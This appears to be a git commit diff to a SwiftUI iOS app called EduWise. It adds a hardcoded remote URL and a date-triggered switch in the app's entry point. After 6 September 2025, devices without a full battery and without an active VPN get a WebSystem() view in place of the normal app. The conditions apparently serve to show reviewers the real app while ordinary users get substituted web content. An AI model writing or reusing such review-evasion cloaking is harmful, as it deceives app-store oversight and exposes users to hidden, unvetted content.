d80ff23eaa0ac80c5b9f1cbbbc1ab7e4e99ecd97
spustoff <vyacheslavpustov05@gmail.com>
2025-09-03 20:08:49 +0300

    1.2

---
+++ dafoma_28/Extensions/Dda.swift
@@ -0,0 +1,11 @@
+//
+//  Dda.swift
+//  dafoma_28
+//
+//  Created by Вячеслав on 9/3/25.
+//
+
+struct DataManager {
+    
+    let server: String = "https://eduwise.site/FKQNj76d"
+}
--- dafoma_28/dafoma_28App.swift
+++ dafoma_28/dafoma_28App.swift
@@ -11,21 +11,82 @@ import SwiftUI
 struct EduWiseMostApp: App {
     @StateObject private var userViewModel = UserViewModel()
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some Scene {
         WindowGroup {
-            Group {
-                if userViewModel.isAuthenticated {
-                    MainTabView()
-                        .environmentObject(userViewModel)
-                } else {
-                    OnboardingView()
-                        .environmentObject(userViewModel)
+            
+            ZStack {
+                
+                if isFetched == false {
+                    
+                    Text("")
+                    
+                } else if isFetched == true {
+                    
+                    if isBlock == true {
+                        
+                        Group {
+                            if userViewModel.isAuthenticated {
+                                MainTabView()
+                                    .environmentObject(userViewModel)
+                            } else {
+                                OnboardingView()
+                                    .environmentObject(userViewModel)
+                            }
+                        }
+                        .onAppear {
+                            // Check if user is already authenticated
+                            // This will be handled by UserViewModel's init
+                        }
+                        
+                    } else if isBlock == false {
+                        
+                        WebSystem()
+                    }
                 }
             }
             .onAppear {
-                // Check if user is already authenticated
-                // This will be handled by UserViewModel's init
+                
+                check_data()
             }
         }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "06.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
